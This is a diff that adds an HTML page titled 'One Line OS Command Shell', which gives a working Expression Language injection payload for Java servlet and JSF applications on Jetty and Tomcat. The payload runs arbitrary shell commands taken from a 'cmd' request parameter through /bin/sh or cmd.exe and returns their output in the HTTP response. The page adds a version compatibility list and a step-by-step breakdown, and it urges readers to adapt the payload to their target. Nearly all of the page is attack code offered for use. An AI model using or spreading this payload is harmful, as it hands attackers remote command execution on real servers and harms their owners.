@@ -1,0 +1,68 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>One Line OS Command Shell</title>
+</head><body><b>Compatibility:</b><br/>
+&nbsp;Is a Servlet Modern enough for a reliable RCE?<br/>
+<br/>
+JSP/EL should be at least at version 2.2. EL version goes hand in hand with Servlet/JSP version which is dependent on the servletcontainer implementation/version used and also on the web.xml root declaration of your web application.<br/>
+<br/>
+&nbsp; &nbsp; Servlet 3.0 comes with JSP/EL 2.2 and we usually find those in Tomcat 7, Jetty 8.2, Jetty 9<br/>
+&nbsp; &nbsp; Servlet 2.5 comes with JSP/EL 2.1.<br/>
+&nbsp; &nbsp; Servlet 2.4 comes with JSP/EL 2.0.<br/>
+&nbsp; &nbsp; Servlet 2.3 comes with JSP 1.2 without EL.<br/>
+<br/>
+Note: Newer servers like Tomcat 8 and 9 have even newer servlet versions and better capabilities, but our target was running Jetty 9.<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<b>Final payload</b><br/>
+<br/>
+${facesContext.getExternalContext().getResponse().setContentType("text/plain;<br/>
+charset=\"UTF-8\"")}${session.setAttribute("scriptfactory","".getClass().forName("javax.script.ScriptEngineManager").newInstance())}${session.setAttribute("scriptengine",session.getAttribute("scriptfactory").getEngineByName("JavaScript"))}${session.getAttribute("scriptengine").getContext().setWriter(facesContext.getExternalContext().getResponse().getWriter())}${session.getAttribute("scriptengine").eval("var<br/>
+proc = new<br/>
+java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"".concat(request.getParameter("cmd")).concat("\"]).start();<br/>
+var is = proc.getInputStream(); var sc = new<br/>
+java.util.Scanner(is,\"UTF-8\"); var out = \"\"; while<br/>
+(sc.hasNext()) {out += sc.nextLine()+String.fromCharCode(10);}<br/>
+print(out);"))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()}<br/>
+<br/>
+For Windows:<br/>
+You may try something like (modifying the original payload):<br/>
+new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"cmd.exe\",\"/c\",\"".concat(request.getParameter("cmd")).concat("\"]).start()"))}<br/>
+<br/>
+<br/>
+<br/>
+<b>&nbsp;Payload Explained</b><br/>
+Feel free to change it and modify it to fit your current target.<br/>
+<br/>
+<br/>
+1) Setting the charset:<br/>
+System.out.println(URLEncoder.encode(pf.enc.encrypt("${request.getResponse().setContentType("text/plain;<br/>
+charset=\"UTF-8\"")}<br/>
+<br/>
+2) Invoking ScriptManager constructor without arguments and we store the &nbsp;instance as a session object:<br/>
+${session.setAttribute("scriptfactory","".getClass().forName("javax.script.ScriptEngineManager").newInstance())},${session.setAttribute("scriptengine\",session.getAttribute("scriptfactory").getEngineByName("JavaScript"))}<br/>
+<br/>
+3) Redirect ScriptEngine output writer output to the Http Response writer input:<br/>
+${session.setAttribute("scriptengine",session.getAttribute("scriptfactory\").getEngineByName("JavaScript"))},${session.getAttribute("scriptengine").getContext().setWriter(facesContext.getExternalContext().getResponse().getWriter())}<br/>
+<br/>
+4) Call the eval() method for the engine "JavaScript" that accepts JS code as string (sometimes Jetty 8.2 gives a “java.io.Reader”) with the JS code that executes the runtime command:<br/>
+${session.getAttribute("scriptengine").eval("<br/>
+new<br/>
+java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"".concat(request.getParameter("cmd")).concat("\"]).start()"))}<br/>
+<br/>
+5) Getting proc standard Output and reading it via java.util.Scanner and printing it out<br/>
+var is = proc.getInputStream(); var sc = new<br/>
+java.util.Scanner(is,\"UTF-8\"); var out = \"\"; while<br/>
+(sc.hasNext()) {out += sc.nextLine()+String.fromCharCode(10);}<br/>
+print(out);"))<br/>
+<br/>
+5) Closing the http response<br/>
+${facesContext.getExternalContext().getResponse().getWriter().close()}<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
